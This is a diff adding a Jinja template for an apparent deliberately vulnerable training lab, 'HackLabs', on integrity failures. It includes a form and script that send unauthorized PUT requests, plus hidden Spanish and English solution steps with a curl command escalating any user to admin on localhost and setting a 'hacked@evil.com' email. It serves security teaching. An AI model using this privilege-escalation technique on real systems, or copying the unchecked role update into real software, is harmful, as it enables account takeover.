@@ -1,0 +1,106 @@
+{% extends "base.html" %}
+{% block title %}Integrity Failures – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4 overflow-x-auto">
+    <table class="hl-table" id="users-table">
+      <thead><tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr></thead>
+      <tbody>
+        {% for u in users %}
+        <tr>
+          <td>{{ u['id'] }}</td>
+          <td style="color:var(--hl-primary)">{{ u['username'] }}</td>
+          <td>{{ u['email'] }}</td>
+          <td><span class="role-{{ u['id'] }} {% if u['role']=='admin' %}text-red-500{% elif u['role']=='manager' %}text-yellow-500{% else %}text-blue-400{% endif %}">{{ u['role'] }}</span></td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+
+  <div class="hl-card mb-4">
+    <div class="text-xs text-gray-500 dark:text-gray-400 font-medium mb-3">PUT /api/user/&lt;id&gt;</div>
+    <div class="space-y-3">
+      <div class="flex gap-3">
+        <div class="flex-1">
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1">Target User ID</label>
+          <input type="number" id="t-id" value="3" min="1" class="hl-input font-mono" />
+        </div>
+        <div class="flex-1">
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1">New Role</label>
+          <select id="t-role" class="hl-input">
+            <option value="admin">admin</option>
+            <option value="manager">manager</option>
+            <option value="user" selected>user</option>
+          </select>
+        </div>
+      </div>
+      <div>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1">New Email (optional)</label>
+        <input type="text" id="t-email" placeholder="new@email.com" class="hl-input font-mono" />
+      </div>
+      <button onclick="exploit()" class="btn-primary">Send PUT</button>
+      <pre id="put-result" class="text-xs text-green-500 hidden mt-2"></pre>
+    </div>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Pasos de explotación</h3>
+    <ol>
+      <li>El endpoint <code>PUT /api/user/&lt;id&gt;</code> no verifica que el usuario autenticado sea el propietario del recurso.</li>
+      <li>El campo <code>role</code> es directamente modificable — escalada de privilegios trivial.</li>
+      <li>Escala <strong>cualquier usuario</strong> a <code>admin</code>:</li>
+    </ol>
+    <pre>curl -X PUT http://localhost:5000/api/user/3 \
+  -H "Content-Type: application/json" \
+  -d '{"role": "admin"}'</pre>
+    <ol start="4">
+      <li>Modifica también el email: <code>{"role":"admin","email":"hacked@evil.com"}</code></li>
+      <li>Con Burp Suite: intercepta cualquier petición, cambia el método a PUT y la URL a <code>/api/user/&lt;id&gt;</code>.</li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">Postman</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Exploitation Steps</h3>
+    <ol>
+      <li>The <code>PUT /api/user/&lt;id&gt;</code> endpoint does not verify that the authenticated user owns the resource.</li>
+      <li>The <code>role</code> field is directly modifiable — trivial privilege escalation.</li>
+      <li>Escalate <strong>any user</strong> to <code>admin</code>:</li>
+    </ol>
+    <pre>curl -X PUT http://localhost:5000/api/user/3 \
+  -H "Content-Type: application/json" \
+  -d '{"role": "admin"}'</pre>
+    <ol start="4">
+      <li>Also modify email: <code>{"role":"admin","email":"hacked@evil.com"}</code></li>
+      <li>With Burp Suite: intercept any request, change method to PUT and URL to <code>/api/user/&lt;id&gt;</code>.</li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">Postman</span></div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function exploit() {
+  const id    = document.getElementById('t-id').value;
+  const role  = document.getElementById('t-role').value;
+  const email = document.getElementById('t-email').value;
+  const body  = { role };
+  if (email) body.email = email;
+  const res  = await fetch('/api/user/' + id, {
+    method: 'PUT', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body)
+  });
+  const data = await res.json();
+  const el   = document.getElementById('put-result');
+  el.textContent = JSON.stringify(data, null, 2);
+  el.classList.remove('hidden');
+  setTimeout(() => location.reload(), 1500);
+}
+</script>
+{% endblock %}
